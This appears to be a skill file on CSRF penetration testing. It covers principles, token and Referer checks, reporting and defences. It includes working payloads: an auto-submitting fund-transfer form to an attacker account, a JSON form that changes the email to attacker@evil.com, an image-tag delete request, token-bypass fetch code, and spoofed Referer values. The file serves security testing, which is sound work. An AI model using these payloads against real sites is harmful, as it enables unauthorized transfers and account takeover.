---
name: csrf-testing
description: Professional skills and methodology for CSRF Cross-Site Request Forgery testing
version: 1.0.0
---

# CSRF Cross-Site Request Forgery Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack method that exploits a user's authenticated state to perform unauthorized operations. This skill provides methods for detecting, exploiting, and protecting against CSRF vulnerabilities.

## Vulnerability Principle

- Attacker lures the user to visit a malicious page
- The malicious page automatically sends requests to the target website
- The browser automatically includes the user's authentication information (Cookie, Session)
- The target website mistakenly treats this as a legitimate user operation

## Testing Methods

### 1. Identify Sensitive Operations

- Password change
- Email change
- Fund transfer
- Permission modification
- Data deletion
- Status update

### 2. Detect CSRF Token

**Check if token protection exists:**
```html
<!-- With token protection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No token protection - CSRF risk exists -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Validate Token Effectiveness

**Test if token is predictable:**
- Is the token based on a timestamp
- Is the token based on user ID
- Is the token reusable
- Is the token shared between multiple requests

### 4. Check Referer Validation

**Test if Referer check can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypass
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**Auto-submit HTML form:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass Content-Type check:**
```html
<!-- Submit JSON via form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET Request CSRF

**Attack via GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If token is in Cookie:**
```javascript
// If token exists in both Cookie and form
// Try submitting only the Cookie token
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // Do not include csrf_token parameter, rely on Cookie
});
```

### SameSite Cookie Bypass

**Exploiting subdomains:**
- If SameSite=Lax, GET requests can still carry cookies
- Attack via subdomains

### Double Submit Cookie

**Bypass token validation:**
```html
<!-- If token is in Cookie and validation logic is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read token from Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value =
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool Usage

### Burp Suite

**Using CSRF PoC Generator:**
1. Intercept target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Use ZAP for CSRF scanning
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Validation and Reporting

### Validation Steps

1. Confirm the target operation has no CSRF token protection
2. Construct malicious request and verify it can be executed
3. Assess impact (data leakage, privilege escalation, financial loss, etc.)
4. Document complete POC

### Reporting Key Points

- Vulnerability location and affected operations
- Attack scenario and impact scope
- Complete exploitation steps and PoC
- Remediation recommendations (CSRF Token, SameSite Cookie, Referer validation, etc.)

## Protective Measures

### Recommended Solutions

1. **CSRF Token**
   - Each form includes a unique token
   - Token stored in Session
   - Validate token effectiveness

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double Submit Cookie**
   - Token exists in both Cookie and form
   - Verify they match

4. **Referer Validation**
   - Verify Referer is same origin
   - Handle empty Referer appropriately

## Notes

- Only perform testing in authorized test environments
- Avoid causing actual impact on user accounts
- Record all testing steps
- Consider behavioral differences across different browsers
